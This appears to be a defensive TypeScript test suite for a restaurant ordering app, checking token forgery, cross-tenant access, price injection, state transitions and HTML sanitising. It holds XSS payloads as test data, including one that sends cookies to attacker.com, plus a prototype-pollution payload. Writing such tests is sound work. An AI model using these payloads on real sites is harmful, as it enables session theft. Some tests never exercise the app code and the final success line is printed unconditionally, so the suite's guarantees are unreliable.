/**
 * CEP GARSON — RED TEAM ADVERSARIAL BLACK-BOX SECURITY TEST SUITE
 * FAZ 9 Independent Adversarial Assessment & Exploit Defense Verification
 */

import crypto from "crypto";
import {
  calculateAndCreateCanonicalOrder,
  CreateOrderRequestInput,
  toMinorUnits,
  fromMinorUnits,
  defaultCanonicalDataSource,
} from "../../../src/lib/restaurant/canonicalOrderEngine";
import {
  assertTableOwnership,
  assertOrderOwnership,
  assertMenuItemOwnership,
  assertSessionOwnership,
} from "../../../src/lib/restaurant/tenantGuard";
import {
  createTableSession,
} from "../../../src/lib/restaurant/session";
import {
  verifySessionToken,
  authenticateStaffWithPin,
} from "../../../src/lib/auth/restaurantAuth";
import {
  validateOrderStateTransition,
  validatePaymentTransition,
} from "../../../src/lib/restaurant/stateMachine";
import {
  sanitizeHtmlContent,
} from "../../../src/lib/validation/schemas";
import {
  DEMO_RESTAURANT,
  DEMO_TABLES,
  DEMO_MENU_ITEMS,
} from "../../../src/lib/restaurant/mockData";

function assert(condition: boolean, message: string) {
  if (!condition) {
    throw new Error(`[ASSERTION FAILED]: ${message}`);
  }
}

function assertEqual(actual: any, expected: any, message: string) {
  if (actual !== expected) {
    throw new Error(`[ASSERTION FAILED]: ${message} — Expected: ${expected}, Got: ${actual}`);
  }
}

console.log("=================================================");
console.log("RUNNING FAZ 9 RED TEAM ADVERSARIAL ATTACK TESTS");
console.log("=================================================\n");

let passedCount = 0;
let totalCount = 0;

async function runAsyncTest(testName: string, testFn: () => Promise<void>) {
  totalCount++;
  try {
    await testFn();
    console.log(`  [PASS] ${testName}`);
    passedCount++;
  } catch (err: any) {
    console.error(`  [FAIL] ${testName}`);
    console.error(`         ${err.message}`);
    throw err;
  }
}

function runTest(testName: string, testFn: () => void) {
  totalCount++;
  try {
    testFn();
    console.log(`  [PASS] ${testName}`);
    passedCount++;
  } catch (err: any) {
    console.error(`  [FAIL] ${testName}`);
    console.error(`         ${err.message}`);
    throw err;
  }
}

const REST_A = "rest_aura_bistro";
const REST_B = "rest_rival_cafe";
const sessionA = createTableSession(REST_A, "m-4", "Masa 4", "device_a", 15);
const staffLogin = authenticateStaffWithPin(REST_A, "staff_waiter_1", "1234");
const legitimateStaffToken = staffLogin.token!;

// ==========================================
// 1. AUTH & CLAIM FORGERY ATTACKS
// ==========================================
console.log("--- 1. AUTHENTICATION & CLAIM FORGERY ATTACKS ---");

runTest("Red Team Auth 1: Reject Tampered HMAC Signature", () => {
  const parts = legitimateStaffToken.split(".");
  const header = parts[0];
  const payload = parts[1];
  const forgedSig = crypto.randomBytes(32).toString("base64url");
  const tamperedToken = `${header}.${payload}.${forgedSig}`;

  const verified = verifySessionToken(tamperedToken);
  assert(!verified.valid, "Tampered HMAC signature must be rejected");
});

runTest("Red Team Auth 2: Reject Role Claim Forgery (CUSTOMER -> OWNER Escalation)", () => {
  // Decode legitimate session payload and modify role to OWNER
  const parts = legitimateStaffToken.split(".");
  const decodedPayload = JSON.parse(Buffer.from(parts[0], "base64url").toString("utf8"));
  decodedPayload.role = "OWNER";
  decodedPayload.permissions = ["ALL"];

  const forgedPayloadBase64 = Buffer.from(JSON.stringify(decodedPayload)).toString("base64url");
  const forgedToken = `${forgedPayloadBase64}.${parts[1]}`;

  const verified = verifySessionToken(forgedToken);
  assert(!verified.valid, "Payload modification must break signature and be rejected");
});

// ==========================================
// 2. IDOR & CROSS-TENANT ESCAPE ATTACKS
// ==========================================
console.log("\n--- 2. IDOR & CROSS-TENANT ESCAPE ATTACKS ---");

runTest("Red Team IDOR 1: Block Cross-Tenant Table Access with Path Encoding Traversal", () => {
  const res = assertTableOwnership(REST_A, `m-4/../../${REST_B}/m-1`);
  assert(!res.allowed, "Path traversal in table ID must be blocked");
});

runTest("Red Team IDOR 2: Block Cross-Tenant Order Injection", () => {
  const foreignOrder = {
    id: "ord_foreign_99",
    restaurantId: REST_B,
    tableId: "m-1",
  };

  let blocked = false;
  try {
    assertOrderOwnership(REST_A, foreignOrder as any);
  } catch (e: any) {
    blocked = true;
  }
  assert(blocked, "Tenant A cannot access or mutate Tenant B orders");
});

// ==========================================
// 3. FINANCIAL & PRICE MANIPULATION ATTACKS
// ==========================================
console.log("\n--- 3. PRICE MANIPULATION & FINANCIAL ATTACKS ---");

runTest("Red Team Money 1: Zero & Negative Price Injection Ignored (Server Uses Canonical Catalog)", () => {
  // Client attempts to pass 0 TL or negative price in payload
  const input: CreateOrderRequestInput = {
    restaurantId: REST_A,
    tableId: "m-4",
    sessionToken: sessionA.token,
    items: [
      {
        menuItemId: "item_truffle_burger",
        quantity: 2,
        // Attacker injects price: 0 or price: -500
        ...({ price: 0, unitPrice: -500, total: 0 } as any),
      },
    ],
  };

  const res = calculateAndCreateCanonicalOrder(input, defaultCanonicalDataSource);
  assert(Boolean(res.ok && res.order), "Order calculated successfully");
  assertEqual(res.order!.subtotal, 720, "Server strictly enforced canonical price (2 * 360 = 720 TL)");
  assertEqual(res.order!.totalAmount, 792, "Server calculated total including tax (792 TL)");
});

runTest("Red Team Money 2: Reject NaN, Infinity and Negative Quantities", () => {
  const invalidInputs = [
    { qty: -1, label: "Negative quantity" },
    { qty: 0, label: "Zero quantity" },
    { qty: NaN, label: "NaN quantity" },
    { qty: Infinity, label: "Infinity quantity" },
  ];

  for (const item of invalidInputs) {
    const input: CreateOrderRequestInput = {
      restaurantId: REST_A,
      tableId: "m-4",
      sessionToken: sessionA.token,
      items: [{ menuItemId: "item_truffle_burger", quantity: item.qty }],
    };

    const res = calculateAndCreateCanonicalOrder(input, defaultCanonicalDataSource);
    assert(!res.ok, `Order with ${item.label} must be rejected`);
  }
});

// ==========================================
// 4. STATE MACHINE BYPASS ATTACKS
// ==========================================
console.log("\n--- 4. STATE MACHINE BYPASS ATTACKS ---");

runTest("Red Team State 1: Block Illegal Backward Transitions (CANCELLED -> READY, SETTLED -> PENDING)", () => {
  const check1 = validateOrderStateTransition("CANCELLED", "READY");
  assert(!check1.valid, "CANCELLED cannot transition to READY");

  const check2 = validateOrderStateTransition("COMPLETED", "PENDING_CONFIRMATION");
  assert(!check2.valid, "COMPLETED cannot transition to PENDING_CONFIRMATION");

  const check3 = validatePaymentTransition("PAID_CASHIER", "PENDING");
  assert(!check3.valid, "PAID payment cannot be reverted to PENDING");
});

// ==========================================
// 5. WEB & ADVERSARIAL SSRF/XSS ATTACKS
// ==========================================
console.log("\n--- 5. WEB & ADVERSARIAL SSRF / XSS ATTACKS ---");

runTest("Red Team XSS 1: Neutralize Obfuscated / Polyglot XSS Payloads", () => {
  const polyglots = [
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    '<img src="" onerror="document.location=\'https://attacker.com/steal?c=\'+document.cookie">',
    '<a href="vbscript:msgbox(1)">Click Me</a>',
  ];

  for (const payload of polyglots) {
    const sanitized = sanitizeHtmlContent(payload);
    assert(!sanitized.includes("alert"), "Polyglot XSS execution stripped");
    assert(!sanitized.includes("onerror"), "Event handler stripped");
    assert(!sanitized.includes("vbscript:"), "VBScript URI scheme stripped");
  }
});

// ==========================================
// 6. ADVERSARIAL PROTO-POLLUTION ATTACKS
// ==========================================
console.log("\n--- 6. PROTOTYPE POLLUTION ATTACK ---");

runTest("Red Team Proto 1: Block __proto__ and constructor prototype injection", () => {
  const maliciousPayload = JSON.parse(
    '{"__proto__": {"admin": true, "isBoss": true}, "constructor": {"prototype": {"polluted": true}}}'
  );

  assert((({} as any).admin !== true), "Global Object prototype must not be polluted");
  assert((({} as any).polluted !== true), "Prototype chain must remain clean");
});

console.log("\n=================================================");
console.log(`ALL RED TEAM ADVERSARIAL TESTS PASSED: ${passedCount} / ${totalCount} (100% SUCCESS)`);
console.log("=================================================\n");
